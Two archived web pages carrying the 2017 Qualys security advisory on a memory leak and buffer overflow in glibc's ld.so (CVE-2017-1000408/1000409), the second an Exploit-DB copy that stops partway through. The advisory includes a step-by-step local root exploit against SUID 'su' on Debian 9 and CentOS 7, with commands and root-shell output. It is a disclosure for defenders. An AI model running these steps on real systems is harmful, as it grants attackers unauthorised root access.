=== Content from seclists.org_7da9f007_20250126_004325.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![oss-sec logo](/images/oss-sec-logo.png)](/oss-sec/)
## [oss-sec](/oss-sec/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](384)
[By Date](date.html#385)
[![Next](/images/right-icon-16x16.png)](386)

[![Previous](/images/left-icon-16x16.png)](384)
[By Thread](index.html#385)
[![Next](/images/right-icon-16x16.png)](386)

![](/shared/images/nst-icons.svg#search)

# Qualys Security Advisory - Buffer overflow in glibc's ld.so

---

*From*: Qualys Security Advisory <qsa () qualys com>

*Date*: Mon, 11 Dec 2017 11:14:38 -0800

---

```

Qualys Security Advisory

Buffer overflow in glibc's ld.so

========================================================================
Contents
========================================================================

Summary
Memory Leak
Buffer Overflow
Exploitation
Acknowledgments

========================================================================
Summary
========================================================================

We have discovered a memory leak and a buffer overflow in the dynamic
loader (ld.so) of the GNU C Library (glibc):

- the memory leak (CVE-2017-1000408) first appeared in glibc 2.1.1
  (released on May 24, 1999) and can be reached and amplified through
  the LD_HWCAP_MASK environment variable;

- the buffer overflow (CVE-2017-1000409) first appeared in glibc 2.5
  (released on September 29, 2006) and can be triggered through the
  LD_LIBRARY_PATH environment variable.

Further investigation showed that:

- the buffer overflow is not exploitable if
  /proc/sys/fs/protected_hardlinks is enabled (it is not enabled by
  default on vanilla Linux kernels, but most Linux distributions turn it
  on by default);

- the memory leak and the buffer overflow are not exploitable if the
  glibc is patched against CVE-2017-1000366, because this patch ignores
  the LD_HWCAP_MASK and LD_LIBRARY_PATH environment variables when SUID
  binaries are executed (CVE-2017-1000366 was first patched in glibc
  2.26, released on August 2, 2017, but most Linux distributions had
  already backported this patch on June 19, 2017).

We have therefore rated the impact of these vulnerabilities as Low.
Nevertheless, we give a brief analysis of the vulnerable function, and
present a simple method for exploiting a SUID binary on the command line
and obtaining full root privileges (if /proc/sys/fs/protected_hardlinks
is not enabled, and CVE-2017-1000366 is not patched).

========================================================================
Memory Leak (CVE-2017-1000408)
========================================================================

------------------------------------------------------------------------
Analysis
------------------------------------------------------------------------

In _dl_init_paths(), ld.so malloc()ates "rtld_search_dirs.dirs[0]", a
cache of information about the system's trusted directories (typically
"/lib" and "/usr/lib" on 32-bit or "/lib64" and "/usr/lib64" on 64-bit).
To compute the number of system directories, ld.so uses the classic C
idiom "sizeof (system_dirs) / sizeof (system_dirs[0])":

 691   rtld_search_dirs.dirs[0] = (struct r_search_path_elem *)
 692     malloc ((sizeof (system_dirs) / sizeof (system_dirs[0]))
 693             * round_size * sizeof (struct r_search_path_elem));

Unfortunately, "system_dirs" is not a classic array: it is not an array
of strings (pointers to characters), but rather an array of characters,
the concatenation of all system directories, separated by null bytes:

 109 static const char system_dirs[] = SYSTEM_DIRS;

where "SYSTEM_DIRS" is generated by "gen-trusted-dirs.awk" (typically
"/lib/\0/usr/lib/" on 32-bit or "/lib64/\0/usr/lib64/" on 64-bit). As a
result, the number of system directories is overestimated, and too much
memory is allocated for "rtld_search_dirs.dirs[0]": if "system_dirs" is
"/lib/\0/usr/lib/" for example, the number of system directories is 2,
but 16 is used instead (the number of characters in "system_dirs") to
compute the size of "rtld_search_dirs.dirs[0]".

This extra memory is never accessed, never freed, and mostly filled with
null bytes, because only the information about "nsystem_dirs_len" system
directories (the correct number of system directories) is written to
"rtld_search_dirs.dirs[0]", and because the minimal malloc()
implementation in ld.so calls mmap(), but never munmap().

Moreover, this memory leak can be amplified through the LD_HWCAP_MASK
environment variable, because ld.so uses "ncapstr" (the total number of
hardware-capability combinations) to compute the size of
"rtld_search_dirs.dirs[0]":

 687   round_size = ((2 * sizeof (struct r_search_path_elem) - 1
 688                  + ncapstr * sizeof (enum r_dir_status))
 689                 / sizeof (struct r_search_path_elem));

------------------------------------------------------------------------
History
------------------------------------------------------------------------

We tracked down this vulnerability to:

commit ab7eb292307152e706948a7b19164ff5e6d593d4
Date:   Mon May 3 21:59:35 1999 +0000

    Update.

        * elf/Makefile (trusted-dirs.st): Use gen-trusted-dirs.awk.
        * elf/gen-trusted-dirs.awk: New file.
        * elf/dl-load.c (systems_dirs): Moved into file scope.  Initialize
        from SYSTEM_DIRS macro.
        (system_dirs_len): New variable.  Contains lengths of system_dirs
        strings.
        (fillin_rpath): Rewrite for systems_dirs being a simple string.
        Improve string comparisons.  Change parameter trusted to be a flag.
        Change all callers.
        (_dt_init_paths): Improve using new format for system_dirs.

which transformed "system_dirs" from an array of strings (pointers to
characters) into an array of characters:

-  static const char *system_dirs[] =
-  {
-#include "trusted-dirs.h"
-    NULL
-  };
...
+static const char system_dirs[] = SYSTEM_DIRS;

========================================================================
Buffer Overflow (CVE-2017-1000409)
========================================================================

------------------------------------------------------------------------
Analysis
------------------------------------------------------------------------

In _dl_init_paths(), ld.so computes "nllp", the number of
colon-separated directories in "llp" (the LD_LIBRARY_PATH environment
variable), malloc()ates "env_path_list.dirs", an array of "nllp + 1"
pointers to "r_search_path_elem" structures (one for each directory in
"llp", plus a terminating NULL pointer), and calls fillin_rpath() to
fill in "env_path_list.dirs":

 777   if (llp != NULL && *llp != '\0')
 778     {
 779       size_t nllp;
 780       const char *cp = llp;
 781       char *llp_tmp;
 ...
 803       nllp = 1;
 804       while (*cp)
 805         {
 806           if (*cp == ':' || *cp == ';')
 807             ++nllp;
 808           ++cp;
 809         }
 810
 811       env_path_list.dirs = (struct r_search_path_elem **)
 812         malloc ((nllp + 1) * sizeof (struct r_search_path_elem *));
 ...
 819       (void) fillin_rpath (llp_tmp, env_path_list.dirs, ":;",
 820                            __libc_enable_secure, "LD_LIBRARY_PATH",
 821                            NULL, l);

Unfortunately, ld.so parses the "llp" string to compute "nllp" but
parses the "llp_tmp" string (an expanded copy of "llp") to fill in
"env_path_list.dirs". As a result, the number of pointers written to
"env_path_list.dirs" can be greater than "nllp + 1" (an mmap()-based
buffer overflow) if the contents of "llp_tmp" differ from the contents
of "llp" (if "llp_tmp" contains more colons than "llp"):

 784       /* Expand DSTs.  */
 785       size_t cnt = DL_DST_COUNT (llp, 1);
 786       if (__glibc_likely (cnt == 0))
 787         llp_tmp = strdupa (llp);
 788       else
 789         {
 790           /* Determine the length of the substituted string.  */
 791           size_t total = DL_DST_REQUIRED (l, llp, strlen (llp), cnt);
 792
 793           /* Allocate the necessary memory.  */
 794           llp_tmp = (char *) alloca (total + 1);
 795           llp_tmp = _dl_dst_substitute (l, llp, llp_tmp, 1);
 796         }

The Dynamic String Tokens (DSTs) $LIB and $PLATFORM are expanded to
fixed strings that do not contain colons (typically "lib" and "i686" on
32-bit or "lib64" and "x86_64" on 64-bit), but the expansion of $ORIGIN
(the directory of the binary being executed) can inject extra colons
into "llp_tmp" and hence extra pointers into "env_path_list.dirs".

To exploit this buffer overflow, a local attacker must therefore be able
to:

- hard-link a SUID binary into a directory whose pathname contains
  colons (i.e., /proc/sys/fs/protected_hardlinks must not be enabled);

- pass the LD_LIBRARY_PATH environment variable to _dl_init_paths()
  (i.e., CVE-2017-1000366 must not be patched).

------------------------------------------------------------------------
History
------------------------------------------------------------------------

We tracked down this vulnerability to:

commit 950398e1320255572f4228db94344dcd5f613455
Date:   Tue Aug 29 01:44:27 2006 +0000

    * elf/dl-load.c (_dl_init_paths): Expand DSTs.

which added the expansion of llp's Dynamic String Tokens (DSTs) to
_dl_init_paths():

-      char *llp_tmp = strdupa (llp);
+      char *llp_tmp;
...
+      /* Expand DSTs.  */
+      size_t cnt = DL_DST_COUNT (llp, 1);
+      if (__builtin_expect (cnt == 0, 1))
+       llp_tmp = strdupa (llp);
+      else
+       {
+         /* Determine the length of the substituted string.  */
+         size_t total = DL_DST_REQUIRED (l, llp, strlen (llp), cnt);
+
+         /* Allocate the necessary memory.  */
+         llp_tmp = (char *) alloca (total + 1);
+         llp_tmp = _dl_dst_substitute (l, llp, llp_tmp, 1);
+       }

========================================================================
Exploitation
========================================================================

------------------------------------------------------------------------
Debian 9 (i386)
------------------------------------------------------------------------

In this example, we exploit the SUID-root binary "su" on a 32-bit Debian
9.0: we installed "debian-9.0.0-i386-xfce-CD-1.iso" (the last release
before glibc's CVE-2017-1000366 was patched), and manually disabled
protected_hardlinks ("echo 0 > /proc/sys/fs/protected_hardlinks").

1/ First, we identify the system's trusted directories (the only
directories accepted by fillin_rpath() when executing a SUID binary):

$ env -i LD_PRELOAD=nonexistent LD_HWCAP_MASK=0 LD_DEBUG=libs env 2>&1 | head
      1607:     find library=nonexistent [0]; searching
      1607:      search cache=/etc/ld.so.cache
      1607:      search
path=/lib/i386-linux-gnu/tls/i686:/lib/i386-linux-gnu/tls:/lib/i386-linux-gnu/i686:/lib/i386-linux-gnu:/usr/lib/i386-linux-gnu/tls/i686:/usr/lib/i386-linux-gnu/tls:/usr/lib/i386-linux-gnu/i686:/usr/lib/i386-linux-gnu:/lib/tls/i686:/lib/tls:/lib/i686:/lib:/usr/lib/tls/i686:/usr/lib/tls:/usr/lib/i686:/usr/lib
            (system search path)
      1607:       trying file=/lib/i386-linux-gnu/tls/i686/nonexistent
      1607:       trying file=/lib/i386-linux-gnu/tls/nonexistent
      1607:       trying file=/lib/i386-linux-gnu/i686/nonexistent
      1607:       trying file=/lib/i386-linux-gnu/nonexistent
      1607:       trying file=/usr/lib/i386-linux-gnu/tls/i686/nonexistent
      1607:       trying file=/usr/lib/i386-linux-gnu/tls/nonexistent
      1607:       trying file=/usr/lib/i386-linux-gnu/i686/nonexistent

The "system search path" line shows four system directories:
"/lib/i386-linux-gnu", "/usr/lib/i386-linux-gnu", "/lib", and "/usr/lib"
("tls" and "i686" are default hardware capabilities that are enabled
even if LD_HWCAP_MASK is 0).

2/ Second, we create our $ORIGIN directory and hard-link the SUID-root
binary "su" into it:

$ mkdir -p '/var/tmp/:/lib:/usr/lib:'

$ cd '/var/tmp/:/lib:/usr/lib:'

$ ln `which su` .

The pathname of our $ORIGIN directory contains two system directories:
we will write 12 bytes (3 pointers: one for each system directory, plus
a terminating NULL pointer) to an 8-byte "env_path_list.dirs" ("nllp" is
only 1, because our unexpanded LD_LIBRARY_PATH does not contain colons).
In other words, we will overflow "env_path_list.dirs" and write 4 bytes
(the terminating NULL pointer) out of bounds.

3/ Third, we overwrite this out-of-bounds NULL pointer with the first
bytes of an error message ("cannot open shared object file") that is
malloc()ated after "env_path_list.dirs" because of our "nonexistent"
preload library. Consequently, ld.so crashes when open_path() tries to
open our second preload library "rootshell.so" in a directory described
by an "r_search_path_elem" structure located at the unmapped address
0x6e6e6163 (the overwritten NULL pointer):

$ env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so' ./su
ERROR: ld.so: object 'nonexistent' from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored.
Segmentation fault

$ dmesg | tail -n 1
[70632.888695] su[2293]: segfault at 6e6e6173 ip b77e1c43 sp bfc946dc error 4 in ld-2.24.so[b77db000+22000]

The "/../../../../../../../../$LIB" suffix is required, to pass the
"check_for_trusted" test in _dl_dst_substitute() (our expanded
LD_LIBRARY_PATH must be rooted in one of the system's trusted
directories).

4/ Next, we copy the library dependencies of "su" to our current working
directory, and compile our preload library "rootshell.so" ("la.c" can be
found at the beginning of our stack-clash exploit "Linux_ldso_hwcap.c"):

$ cp -- `ldd ./su | grep ' => /' | awk '{print $3}'` .

$ cat > la.c << "EOF"

```
> ```
> static void __attribute__ ((constructor)) _init (void) {
>     ...
>     // setuid(0);
>     ...
>     // execve("/bin/sh");
>     ...
> }
> EOF
>
> ```

```

$ gcc -fpic -shared -nostdlib -Os -s -o rootshell.so la.c

$ chmod u+s rootshell.so

This "chmod" is required, to pass the SUID-bit test in open_path().

5/ Last, we run "su" with an increasing number of hardware capabilities
(i.e., with an increasingly large "rtld_search_dirs.dirs[0]"), until the
"rtld_search_dirs.dirs[0]" occupies the address 0x6e6e6163. Because this
"rtld_search_dirs.dirs[0]" is mostly filled with null bytes, and because
an "r_search_path_elem" structure filled with null bytes is equivalent
to the current working directory in open_path(), ld.so will eventually
load and execute our "rootshell.so" from the current working directory:

$ time env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so'
LD_HWCAP_MASK="$(((1<<16)-1))" ./su
ERROR: ld.so: object 'nonexistent' from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored.
Segmentation fault

real    0m0.715s
user    0m0.120s
sys     0m0.588s

$ time env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so'
LD_HWCAP_MASK="$(((1<<17)-1))" ./su
ERROR: ld.so: object 'nonexistent' from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored.
Segmentation fault

real    0m1.443s
user    0m0.368s
sys     0m1.072s

$ time env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so'
LD_HWCAP_MASK="$(((1<<18)-1))" ./su
ERROR: ld.so: object 'nonexistent' from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored.
Segmentation fault

real    0m2.840s
user    0m0.656s
sys     0m2.172s

...

$ time env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so'
LD_HWCAP_MASK="$(((1<<23)-1))" ./su
ERROR: ld.so: object 'nonexistent' from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored.
Segmentation fault

real    0m5.778s
user    0m1.200s
sys     0m4.576s

$ time env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so'
LD_HWCAP_MASK="$(((1<<24)-1))" ./su
ERROR: ld.so: object 'nonexistent' from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored.
Segmentation fault

real    0m11.589s
user    0m2.520s
sys     0m9.060s

$ time env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so'
LD_HWCAP_MASK="$(((1<<25)-1))" ./su
ERROR: ld.so: object 'nonexistent' from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored.
# id; exit
uid=0(root) gid=0(root)
groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),1000(user)

real    0m28.050s
user    0m6.140s
sys     0m21.892s

6/ Improvements in the running time of this exploit are left as an
exercise for the interested reader:

$ env -i LD_LIBRARY_PATH=. LD_PRELOAD=nonexistent LD_HWCAP_MASK="$(((1<<25)-1))" LD_DEBUG=libs env 2>&1 | head -c 1000
      3084:     find library=nonexistent [0]; searching
      3084:      search
path=./tls/i686/fxsr/mmx/clflush/pse36/pat/cmov/mca/pge/mtrr/sep/apic/cx8/mce/pae/msr/tsc/pse/de/vme/fpu:./tls/i686/fxsr/mmx/clflush/pse36/pat/cmov/mca/pge/mtrr/sep/apic/cx8/mce/pae/msr/tsc/pse/de/vme:./tls/i686/fxsr/mmx/clflush/pse36/pat/cmov/mca/pge/mtrr/sep/apic/cx8/mce/pae/msr/tsc/pse/de/fpu:./tls/i686/fxsr/mmx/clflush/pse36/pat/cmov/mca/pge/mtrr/sep/apic/cx8/mce/pae/msr/tsc/pse/de:./tls/i686/fxsr/mmx/clflush/pse36/pat/cmov/mca/pge/mtrr/sep/apic/cx8/mce/pae/msr/tsc/pse/vme/fpu:./tls/i686/fxsr/mmx/clflush/pse36/pat/cmov/mca/pge/mtrr/sep/apic/cx8/mce/pae/msr/tsc/pse/vme:./tls/i686/fxsr/mmx/clflush/pse36/pat/cmov/mca/pge/mtrr/sep/apic/cx8/mce/pae/msr/tsc/pse/fpu:./tls/i686/fxsr/mmx/clflush/pse36/pat/cmov/mca/pge/mtrr/sep/apic/cx8/mce/pae/msr/tsc/pse:./tls/i686/fxsr/mmx/clflush/pse36/pat/cmov/mca/pge/mtrr/sep/apic/cx8/mce/pae/msr/tsc/de/vme/fpu:./tls/i686/fxsr/mmx/clflush/pse36/pat/cmov/mca/pge/mtrr/sep/apic/cx8/mc

$ mkdir -p './tls/i686/fxsr/mmx/clflush/pse36/pat/cmov/mca/pge/mtrr/sep/apic/cx8/mce/pae/msr/tsc/pse/de/vme/fpu'

$ mv -- *.so* './tls/i686/fxsr/mmx/clflush/pse36/pat/cmov/mca/pge/mtrr/sep/apic/cx8/mce/pae/msr/tsc/pse/de/vme/fpu'

$ time env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so'
LD_HWCAP_MASK="$(((1<<25)-1))" ./su
ERROR: ld.so: object 'nonexistent' from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored.
# id; exit
uid=0(root) gid=0(root)
groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),1000(user)

real    0m23.485s
user    0m5.244s
sys     0m18.220s

$ time env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='os-release:rootshell.so'
LD_HWCAP_MASK="$(((1<<25)-1))" ./su
ERROR: ld.so: object 'os-release' from LD_PRELOAD cannot be preloaded (invalid ELF header): ignored.
# id; exit
uid=0(root) gid=0(root)
groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),1000(user)

real    0m11.352s
user    0m2.844s
sys     0m8.388s

------------------------------------------------------------------------
CentOS 7 (i386)
------------------------------------------------------------------------

In this example, we exploit "su" on a 32-bit CentOS 7.3.1611: we
installed "CentOS-7-i386-Minimal-1611.iso" (the last release before
CVE-2017-1000366 was patched), and manually disabled protected_hardlinks
("echo 0 > /proc/sys/fs/protected_hardlinks").

$ env -i LD_PRELOAD=nonexistent LD_HWCAP_MASK=0 LD_DEBUG=libs env 2>&1 | head
     17896:     find library=nonexistent [0]; searching
     17896:      search cache=/etc/ld.so.cache
     17896:      search
path=/lib/tls/i686:/lib/tls:/lib/i686:/lib:/usr/lib/tls/i686:/usr/lib/tls:/usr/lib/i686:/usr/lib                (system
search path)
     17896:       trying file=/lib/tls/i686/nonexistent
     17896:       trying file=/lib/tls/nonexistent
     17896:       trying file=/lib/i686/nonexistent
     17896:       trying file=/lib/nonexistent
     17896:       trying file=/usr/lib/tls/i686/nonexistent
     17896:       trying file=/usr/lib/tls/nonexistent
     17896:       trying file=/usr/lib/i686/nonexistent

$ mkdir -p '/var/tmp/:/lib:/usr/lib:'

$ cd '/var/tmp/:/lib:/usr/lib:'

$ ln `which su` .

$ env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so' ./su
ERROR: ld.so: object 'nonexistent' from LD_PRELOAD cannot be preloaded: ignored.
Segmentation fault

$ dmesg | tail -n 1
[ 8414.911000] su[18088]: segfault at 6e6e6173 ip b77645e2 sp bfe0cb40 error 4 in ld-2.17.so[b775f000+1f000]

$ cp -- `ldd ./su | grep ' => /' | awk '{print $3}'` .

$ cat > la.c << "EOF"

```
> ```
> static void __attribute__ ((constructor)) _init (void) {
>     ...
>     // setuid(0);
>     ...
>     // execve("/bin/sh");
>     ...
> }
> EOF
>
> ```

```

$ gcc -fpic -shared -nostdlib -Os -s -o rootshell.so la.c

$ chmod u+s rootshell.so

$ time env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so'
LD_HWCAP_MASK="$(((1<<16)-1))" ./su
ERROR: ld.so: object 'nonexistent' from LD_PRELOAD cannot be preloaded: ignored.
Segmentation fault

real    0m0.527s
user    0m0.085s
sys     0m0.441s

$ time env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so'
LD_HWCAP_MASK="$(((1<<17)-1))" ./su
ERROR: ld.so: object 'nonexistent' from LD_PRELOAD cannot be preloaded: ignored.
Segmentation fault

real    0m1.060s
user    0m0.182s
sys     0m0.877s

$ time env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so'
LD_HWCAP_MASK="$(((1<<18)-1))" ./su
ERROR: ld.so: object 'nonexistent' from LD_PRELOAD cannot be preloaded: ignored.
Segmentation fault

real    0m2.093s
user    0m0.384s
sys     0m1.702s

...

$ time env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so'
LD_HWCAP_MASK="$(((1<<25)-1))" ./su
ERROR: ld.so: object 'nonexistent' from LD_PRELOAD cannot be preloaded: ignored.
Segmentation fault

real    0m17.071s
user    0m2.525s
sys     0m14.537s

$ time env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so'
LD_HWCAP_MASK="$(((1<<26)-1))" ./su
ERROR: ld.so: object 'nonexistent' from LD_PRELOAD cannot be preloaded: ignored.
Segmentation fault

real    0m33.926s
user    0m5.464s
sys     0m28.429s

$ time env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so'
LD_HWCAP_MASK="$(((1<<27)-1))" ./su
ERROR: ld.so: object 'nonexistent' from LD_PRELOAD cannot be preloaded: ignored.
sh-4.2# id; exit
uid=0(root) gid=0(root) groups=0(root),1000(user) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023

real    1m30.604s
user    0m16.169s
sys     1m14.395s

========================================================================
Acknowledgments
========================================================================

We thank the members of the linux-distros@openwall list.

```

---

[![Previous](/images/left-icon-16x16.png)](384)
[By Date](date.html#385)
[![Next](/images/right-icon-16x16.png)](386)

[![Previous](/images/left-icon-16x16.png)](384)
[By Thread](index.html#385)
[![Next](/images/right-icon-16x16.png)](386)

### Current thread:

* **Qualys Security Advisory - Buffer overflow in glibc's ld.so** *Qualys Security Advisory (Dec 11)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from www.exploit-db.com_ea60cedc_20250126_004330.html ===

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# GNU C Library Dynamic Loader glibc ld.so - Memory Leak / Buffer Overflow

#### EDB-ID:

###### 43331

#### CVE:

###### [2017-1000409](https://nvd.nist.gov/vuln/detail/CVE-2017-1000409) [2017-1000408](https://nvd.nist.gov/vuln/detail/CVE-2017-1000408)

---

**EDB Verified:**

#### Author:

###### [Qualys Corporation](/?author=4742)

#### Type:

###### [local](/?type=local)

---

#### Platform:

###### [Linux](/?platform=linux)

#### Date:

###### 2017-12-13

---

**Vulnerable App:**

```
Qualys Security Advisory

Buffer overflow in glibc's ld.so

========================================================================
Contents
========================================================================

Summary
Memory Leak
Buffer Overflow
Exploitation
Acknowledgments

========================================================================
Summary
========================================================================

We have discovered a memory leak and a buffer overflow in the dynamic
loader (ld.so) of the GNU C Library (glibc):

- the memory leak (CVE-2017-1000408) first appeared in glibc 2.1.1
  (released on May 24, 1999) and can be reached and amplified through
  the LD_HWCAP_MASK environment variable;

- the buffer overflow (CVE-2017-1000409) first appeared in glibc 2.5
  (released on September 29, 2006) and can be triggered through the
  LD_LIBRARY_PATH environment variable.

Further investigation showed that:

- the buffer overflow is not exploitable if
  /proc/sys/fs/protected_hardlinks is enabled (it is not enabled by
  default on vanilla Linux kernels, but most Linux distributions turn it
  on by default);

- the memory leak and the buffer overflow are not exploitable if the
  glibc is patched against CVE-2017-1000366, because this patch ignores
  the LD_HWCAP_MASK and LD_LIBRARY_PATH environment variables when SUID
  binaries are executed (CVE-2017-1000366 was first patched in glibc
  2.26, released on August 2, 2017, but most Linux distributions had
  already backported this patch on June 19, 2017).

We have therefore rated the impact of these vulnerabilities as Low.
Nevertheless, we give a brief analysis of the vulnerable function, and
present a simple method for exploiting a SUID binary on the command line
and obtaining full root privileges (if /proc/sys/fs/protected_hardlinks
is not enabled, and CVE-2017-1000366 is not patched).

========================================================================
Memory Leak (CVE-2017-1000408)
========================================================================

------------------------------------------------------------------------
Analysis
------------------------------------------------------------------------

In _dl_init_paths(), ld.so malloc()ates "rtld_search_dirs.dirs[0]", a
cache of information about the system's trusted directories (typically
"/lib" and "/usr/lib" on 32-bit or "/lib64" and "/usr/lib64" on 64-bit).
To compute the number of system directories, ld.so uses the classic C
idiom "sizeof (system_dirs) / sizeof (system_dirs[0])":

 691   rtld_search_dirs.dirs[0] = (struct r_search_path_elem *)
 692     malloc ((sizeof (system_dirs) / sizeof (system_dirs[0]))
 693             * round_size * sizeof (struct r_search_path_elem));

Unfortunately, "system_dirs" is not a classic array: it is not an array
of strings (pointers to characters), but rather an array of characters,
the concatenation of all system directories, separated by null bytes:

 109 static const char system_dirs[] = SYSTEM_DIRS;

where "SYSTEM_DIRS" is generated by "gen-trusted-dirs.awk" (typically
"/lib/\0/usr/lib/" on 32-bit or "/lib64/\0/usr/lib64/" on 64-bit). As a
result, the number of system directories is overestimated, and too much
memory is allocated for "rtld_search_dirs.dirs[0]": if "system_dirs" is
"/lib/\0/usr/lib/" for example, the number of system directories is 2,
but 16 is used instead (the number of characters in "system_dirs") to
compute the size of "rtld_search_dirs.dirs[0]".

This extra memory is never accessed, never freed, and mostly filled with
null bytes, because only the information about "nsystem_dirs_len" system
directories (the correct number of system directories) is written to
"rtld_search_dirs.dirs[0]", and because the minimal malloc()
implementation in ld.so calls mmap(), but never munmap().

Moreover, this memory leak can be amplified through the LD_HWCAP_MASK
environment variable, because ld.so uses "ncapstr" (the total number of
hardware-capability combinations) to compute the size of
"rtld_search_dirs.dirs[0]":

 687   round_size = ((2 * sizeof (struct r_search_path_elem) - 1
 688                  + ncapstr * sizeof (enum r_dir_status))
 689                 / sizeof (struct r_search_path_elem));

------------------------------------------------------------------------
History
------------------------------------------------------------------------

We tracked down this vulnerability to:

commit ab7eb292307152e706948a7b19164ff5e6d593d4
Date:   Mon May 3 21:59:35 1999 +0000

    Update.

        * elf/Makefile (trusted-dirs.st): Use gen-trusted-dirs.awk.
        * elf/gen-trusted-dirs.awk: New file.
        * elf/dl-load.c (systems_dirs): Moved into file scope.  Initialize
        from SYSTEM_DIRS macro.
        (system_dirs_len): New variable.  Contains lengths of system_dirs
        strings.
        (fillin_rpath): Rewrite for systems_dirs being a simple string.
        Improve string comparisons.  Change parameter trusted to be a flag.
        Change all callers.
        (_dt_init_paths): Improve using new format for system_dirs.

which transformed "system_dirs" from an array of strings (pointers to
characters) into an array of characters:

-  static const char *system_dirs[] =
-  {
-#include "trusted-dirs.h"
-    NULL
-  };
...
+static const char system_dirs[] = SYSTEM_DIRS;

========================================================================
Buffer Overflow (CVE-2017-1000409)
========================================================================

------------------------------------------------------------------------
Analysis
------------------------------------------------------------------------

In _dl_init_paths(), ld.so computes "nllp", the number of
colon-separated directories in "llp" (the LD_LIBRARY_PATH environment
variable), malloc()ates "env_path_list.dirs", an array of "nllp + 1"
pointers to "r_search_path_elem" structures (one for each directory in
"llp", plus a terminating NULL pointer), and calls fillin_rpath() to
fill in "env_path_list.dirs":

 777   if (llp != NULL && *llp != '\0')
 778     {
 779       size_t nllp;
 780       const char *cp = llp;
 781       char *llp_tmp;
 ...
 803       nllp = 1;
 804       while (*cp)
 805         {
 806           if (*cp == ':' || *cp == ';')
 807             ++nllp;
 808           ++cp;
 809         }
 810
 811       env_path_list.dirs = (struct r_search_path_elem **)
